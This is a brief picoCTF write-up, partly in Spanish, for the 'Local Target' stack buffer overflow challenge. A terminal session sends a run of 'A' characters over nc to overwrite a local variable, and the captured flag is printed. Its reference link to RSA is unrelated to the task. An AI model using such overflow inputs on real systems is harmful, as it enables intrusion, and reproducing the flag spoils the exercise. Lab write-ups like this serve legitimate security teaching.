# Local Target

## Objetivo

Smash the stack Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/519/local-target). You can view source [here](https://artifacts.picoctf.net/c/519/local-target.c). And connect with it using: `nc saturn.picoctf.net 61512`

## Hints

- Do anything you can to change `num`.
- When you change `num`, view the value as hexadecimal.

## Solución

```     
                                                                                                                                                                      
┌──(kali㉿kali)-[/media/sf_SEGURIDAD/Parcial III/Binary Explotation/02- Local Target]
└─$ ls                   
local-target  local-target.c  Untitled.md
                                                                                                                                                                      
┌──(kali㉿kali)-[/media/sf_SEGURIDAD/Parcial III/Binary Explotation/02- Local Target]
└─$ chmod +x local-target
                                                                                                                                                                      
┌──(kali㉿kali)-[/media/sf_SEGURIDAD/Parcial III/Binary Explotation/02- Local Target]
└─$ ./local-target       
Enter a string: xcxzcsvcvcxzvvvvvvvvvv

num is 64
Bye!
                                                                                                                                                                      
┌──(kali㉿kali)-[/media/sf_SEGURIDAD/Parcial III/Binary Explotation/02- Local Target]
└─$ nc saturn.picoctf.net 61512
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
                                                                                                                                                                      
┌──(kali㉿kali)-[/media/sf_SEGURIDAD/Parcial III/Binary Explotation/02- Local Target]
└─$ 

```

## Flag

picoCTF{l0c4l5_1n_5c0p3_ee58441a}

## Notas adicionales

Analizamos el codigo: en el codigo c veremos que win es 65.

## Referencias

[rsa](https://simple.wikipedia.org/wiki/RSA_algorithm)